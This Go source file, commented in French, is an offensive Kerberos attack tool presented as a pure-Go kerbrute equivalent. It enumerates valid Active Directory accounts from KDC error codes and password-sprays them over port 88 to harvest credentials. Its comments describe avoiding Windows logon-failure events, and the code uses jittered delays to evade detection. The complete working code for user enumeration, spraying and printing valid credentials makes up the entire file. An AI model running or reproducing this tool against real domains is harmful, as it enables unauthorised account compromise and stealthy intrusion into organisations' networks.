// pkg/kerberos/bruteforce.go
//
// Bruteforce Kerberos natif via AS-REQ (équivalent kerbrute en Go pur)
//
// Avantages vs spray classique NTLM :
//   - Aucun log d'authentification Windows Event 4625 (moins bruyant)
//   - Les erreurs KDC distinguent : compte inexistant / mauvais mdp / compte locké
//   - Fonctionne sans accès SMB/LDAP (port 88 uniquement)
//   - Compatible avec les comptes sans pré-authentification (DONT_REQUIRE_PREAUTH)
//
// Modes :
//   UserEnum  — énumérer les comptes valides sans mot de passe (KDC_ERR_PREAUTH_REQUIRED = compte existe)
//   Bruteforce — tester un mot de passe sur une liste d'utilisateurs
//   PasswordSpray — password spray Kerberos

package kerberos

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
)

// KerbResult résultat d'une tentative Kerberos
type KerbResult struct {
	Username  string
	Password  string
	Valid     bool // compte existe (même si mdp faux)
	Success   bool // authentification réussie
	Locked    bool // compte locké
	Disabled  bool // compte désactivé
	NoPreAuth bool // DONT_REQUIRE_PREAUTH
	Error     string
}

// BruteConfig configuration du bruteforce
type BruteConfig struct {
	Domain        string
	DCIP          string
	UsersFile     string
	PasswordsFile string
	Password      string   // pour le spray (un seul mdp)
	Users         []string // liste directe si pas de fichier
	Threads       int
	Delay         int // ms entre tentatives
	Jitter        int // % de variation
	StopOnFirst   bool
	UserEnumOnly  bool // juste énumérer les comptes valides
	Verbose       bool
}

// BruteResult résultat global
type BruteResult struct {
	ValidUsers  []string
	ValidCreds  []KerbResult
	LockedUsers []string
	Attempts    int
	Duration    time.Duration
}

// ============================================================
// Enumération de comptes (UserEnum)
// ============================================================

// EnumerateUsers identifie les comptes valides via AS-REQ sans mot de passe.
// KDC_ERR_PREAUTH_REQUIRED → compte existe
// KDC_ERR_C_PRINCIPAL_UNKNOWN → compte inexistant
func EnumerateUsers(cfg *BruteConfig) (*BruteResult, error) {
	users, err := loadUsers(cfg)
	if err != nil {
		return nil, err
	}

	fmt.Printf("[*] Kerbrute UserEnum — %d users → %s (%s)\n",
		len(users), cfg.DCIP, strings.ToUpper(cfg.Domain))

	realm := strings.ToUpper(cfg.Domain)
	krb5Conf, err := config.NewFromString(buildKrb5Config(realm, cfg.DCIP))
	if err != nil {
		return nil, fmt.Errorf("kerberos config error: %v", err)
	}

	result := &BruteResult{}
	start := time.Now()

	jobs := make(chan string, len(users))
	results := make(chan KerbResult, len(users))

	threads := cfg.Threads
	if threads <= 0 {
		threads = 10
	}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for username := range jobs {
				r := probeUser(username, realm, krb5Conf)
				results <- r
				sleepWithJitter(cfg.Delay, cfg.Jitter)
			}
		}()
	}

	for _, u := range users {
		jobs <- u
	}
	close(jobs)

	go func() {
		wg.Wait()
		close(results)
	}()

	for r := range results {
		result.Attempts++
		if r.Valid {
			result.ValidUsers = append(result.ValidUsers, r.Username)
			if r.NoPreAuth {
				fmt.Printf("[+] VALID (NO PREAUTH): %s\n", r.Username)
			} else if r.Disabled {
				fmt.Printf("[!] VALID (DISABLED):  %s\n", r.Username)
			} else if r.Locked {
				fmt.Printf("[!] VALID (LOCKED):    %s\n", r.Username)
			} else {
				fmt.Printf("[+] VALID:             %s\n", r.Username)
			}
		} else if cfg.Verbose {
			fmt.Printf("[-] INVALID:           %s\n", r.Username)
		}
	}

	result.Duration = time.Since(start)
	return result, nil
}

// ============================================================
// Password Spray Kerberos
// ============================================================

// KerberosSpray effectue un password spray via AS-REQ Kerberos.
// Plus discret que NTLM : un seul log Event 4768 (TGT Request) vs 4625 (logon failure).
func KerberosSpray(cfg *BruteConfig) (*BruteResult, error) {
	users, err := loadUsers(cfg)
	if err != nil {
		return nil, err
	}

	passwords := []string{cfg.Password}
	if cfg.PasswordsFile != "" {
		passwords, err = readLines(cfg.PasswordsFile)
		if err != nil {
			return nil, fmt.Errorf("cannot read passwords file: %v", err)
		}
	}

	fmt.Printf("[*] Kerberos Spray — %d users × %d password(s) → %s (%s)\n",
		len(users), len(passwords), cfg.DCIP, strings.ToUpper(cfg.Domain))
	fmt.Printf("[*] Threads: %d | Delay: %dms ± %d%%\n", cfg.Threads, cfg.Delay, cfg.Jitter)

	realm := strings.ToUpper(cfg.Domain)
	krb5Conf, err := config.NewFromString(buildKrb5Config(realm, cfg.DCIP))
	if err != nil {
		return nil, fmt.Errorf("kerberos config error: %v", err)
	}

	result := &BruteResult{}
	start := time.Now()

	// Spray par mot de passe (pas par user — protection lockout)
	for _, password := range passwords {
		fmt.Printf("\n[*] Spraying: %s\n", maskPwd(password))

		jobs := make(chan string, len(users))
		results := make(chan KerbResult, len(users))

		threads := cfg.Threads
		if threads <= 0 {
			threads = 5
		}

		var wg sync.WaitGroup
		for i := 0; i < threads; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for username := range jobs {
					r := tryKerberosAuth(username, password, realm, krb5Conf)
					results <- r
					sleepWithJitter(cfg.Delay, cfg.Jitter)
				}
			}()
		}

		for _, u := range users {
			jobs <- u
		}
		close(jobs)

		go func() {
			wg.Wait()
			close(results)
		}()

		for r := range results {
			result.Attempts++
			if r.Success {
				fmt.Printf("[+] VALID CREDENTIALS: %s:%s\n", r.Username, password)
				result.ValidCreds = append(result.ValidCreds, r)
				if cfg.StopOnFirst {
					return result, nil
				}
			} else if r.Locked {
				fmt.Printf("[!] LOCKED: %s\n", r.Username)
				result.LockedUsers = append(result.LockedUsers, r.Username)
			} else if cfg.Verbose {
				fmt.Printf("[-] %s:%s — %s\n", r.Username, maskPwd(password), r.Error)
			}
		}

		// Pause entre chaque mot de passe
		if len(passwords) > 1 {
			pause := time.Duration(cfg.Delay*3) * time.Millisecond
			fmt.Printf("[*] Pausing %v before next password...\n", pause)
			time.Sleep(pause)
		}
	}

	result.Duration = time.Since(start)
	printBruteResult(result)
	return result, nil
}

// ============================================================
// Fonctions internes
// ============================================================

// probeUser envoie un AS-REQ sans mot de passe pour vérifier l'existence du compte
func probeUser(username, realm string, krb5Conf *config.Config) KerbResult {
	r := KerbResult{Username: username}

	cl := client.NewWithPassword(username, realm, "", krb5Conf,
		client.DisablePAFXFAST(true))

	err := cl.Login()
	if err == nil {
		r.Valid = true
		r.Success = true
		r.NoPreAuth = true
		return r
	}

	errStr := err.Error()
	switch {
	case strings.Contains(errStr, "KDC_ERR_PREAUTH_REQUIRED"):
		r.Valid = true // compte existe, pré-auth requise
	case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
		r.Valid = false
		r.Error = "user not found"
	case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED"):
		r.Valid = true
		r.Locked = true
	case strings.Contains(errStr, "KDC_ERR_CLIENT_NOT_TRUSTED"):
		r.Valid = true
		r.Disabled = true
	default:
		// Toute autre erreur KDC indique que le compte existe (le KDC a répondu)
		if strings.Contains(errStr, "KDC") || strings.Contains(errStr, "kdc") {
			r.Valid = true
			r.Error = errStr
		} else {
			r.Valid = false
			r.Error = errStr
		}
	}

	return r
}

// tryKerberosAuth tente une authentification Kerberos complète
func tryKerberosAuth(username, password, realm string, krb5Conf *config.Config) KerbResult {
	r := KerbResult{Username: username, Password: password}

	cl := client.NewWithPassword(username, realm, password, krb5Conf,
		client.DisablePAFXFAST(true))

	err := cl.Login()
	if err == nil {
		r.Valid = true
		r.Success = true
		return r
	}

	errStr := err.Error()
	switch {
	case strings.Contains(errStr, "KDC_ERR_PREAUTH_FAILED"):
		r.Valid = true
		r.Error = "wrong password"
	case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
		r.Error = "user not found"
	case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED"):
		r.Valid = true
		r.Locked = true
		r.Error = "account locked"
	case strings.Contains(errStr, "KDC_ERR_KEY_EXPIRED"):
		r.Valid = true
		r.Error = "password expired"
	default:
		r.Valid = strings.Contains(errStr, "KDC")
		r.Error = errStr
	}

	return r
}

func printBruteResult(result *BruteResult) {
	fmt.Printf("\n[*] Kerberos spray complete — %d attempts in %v\n",
		result.Attempts, result.Duration.Round(time.Second))
	if len(result.ValidCreds) > 0 {
		fmt.Printf("[+] Valid credentials (%d):\n", len(result.ValidCreds))
		for _, c := range result.ValidCreds {
			fmt.Printf("    %s:%s\n", c.Username, c.Password)
		}
	}
	if len(result.LockedUsers) > 0 {
		fmt.Printf("[!] Locked accounts (%d): %s\n", len(result.LockedUsers),
			strings.Join(result.LockedUsers, ", "))
	}
}

func loadUsers(cfg *BruteConfig) ([]string, error) {
	if len(cfg.Users) > 0 {
		return cfg.Users, nil
	}
	if cfg.UsersFile != "" {
		return readLines(cfg.UsersFile)
	}
	return nil, fmt.Errorf("no users provided (--users or --users-file)")
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, sc.Err()
}

func sleepWithJitter(delayMs, jitterPct int) {
	if delayMs <= 0 {
		return
	}
	delay := float64(delayMs)
	if jitterPct > 0 {
		variation := delay * float64(jitterPct) / 100.0
		delay += (rand.Float64()*2 - 1) * variation
	}
	if delay < 0 {
		delay = 0
	}
	time.Sleep(time.Duration(delay) * time.Millisecond)
}

func maskPwd(p string) string {
	if len(p) <= 2 {
		return "**"
	}
	return p[:1] + strings.Repeat("*", len(p)-1)
}
